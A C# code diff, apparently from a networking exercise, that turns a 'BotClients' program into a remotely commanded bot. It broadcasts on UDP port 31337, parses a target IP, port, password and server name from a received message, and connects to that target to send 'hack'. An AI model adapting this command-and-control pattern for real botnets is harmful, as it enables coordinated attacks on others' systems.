@@ -18,7 +18,50 @@ namespace BotClients
 			
 			///int port2 = ((IPEndPoint)client.Client.LocalEndPoint).Port;
 			Console.WriteLine("Bot is listening on port " + port_);
-			//Console.Write("receive data from " + ep.ToString());
+			Thread listenThread = new Thread(() =>
+			{
+				//try
+				//{
+					byte[] receivedData = client.Receive(ref ep);
+					byte[] ip_to_attack = new byte[4];
+					byte[] port_to_attack = new byte[2];
+					byte[] pass_to_attack = new byte[6];
+					byte[] name_of_server = new byte[32];
+					int j = 0;
+					for (int i = 0; i < 4; i++)
+					{
+						ip_to_attack[j] = receivedData[i];
+						j++;
+					}
+					j = 0;
+					for (int i = 4; i < 6; i++)
+					{
+						port_to_attack[j] = receivedData[i];
+						j++;
+					}
+					j = 0;
+					for (int i = 6; i < 12; i++)
+					{
+						pass_to_attack[j] = receivedData[i];
+						j++;
+					}
+					j = 0;
+					for (int i = 12; i < 44; i++)
+					{
+						name_of_server[j] = receivedData[i];
+						j++;
+					}
+					Console.WriteLine("bot " + receivedData);
+					attack(ip_to_attack, port_to_attack, pass_to_attack, name_of_server);
+				//}
+				//catch (Exception e)
+				//{
+				//	Console.WriteLine("exp " + e.Message);
+				//}
+
+			});
+			listenThread.Start();
+				//Console.Write("receive data from " + ep.ToString());
 			while (true)
 			{
 
@@ -33,31 +76,19 @@ namespace BotClients
 				// send data
 				client.Send(int_bytes, int_bytes.Length, new IPEndPoint(IPAddress.Broadcast, 31337) );
 
-				// then receive data
-				//
-
-				//
-				/*
-				try
-				{
-					byte[] receivedData = client.Receive(ref ep);
-					Console.WriteLine("bot " + receivedData);
-				}
-				catch(Exception e)
-				{
-					Console.WriteLine("exp " + e.Message);
-				}
-				*/
 				Thread.Sleep(1000);
 			}
 		
 		}
-		public static void attack(int port_vic)
+		public static void attack(byte[] ip_to_attack, byte[] port_to_attack, byte[] pass_to_attack, byte[] name_of_server)
 		{
 			
 			Socket s = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
 			IPAddress[] ipnew = Dns.GetHostAddresses(Dns.GetHostName());
-			IPEndPoint ipEnd = new IPEndPoint(ipnew[1], port_vic);
+			IPAddress temp = new IPAddress(ip_to_attack);
+			IPEndPoint ipEnd = new IPEndPoint(new IPAddress(ip_to_attack), BitConverter.ToUInt16(port_to_attack, 0));
+			//IPEndPoint ipEnd = new IPEndPoint(ipnew[1], BitConverter.ToUInt16(port_to_attack, 0));
+
 			s.Connect(ipEnd);
 			
 			s.Send(System.Text.Encoding.ASCII.GetBytes("hack"));
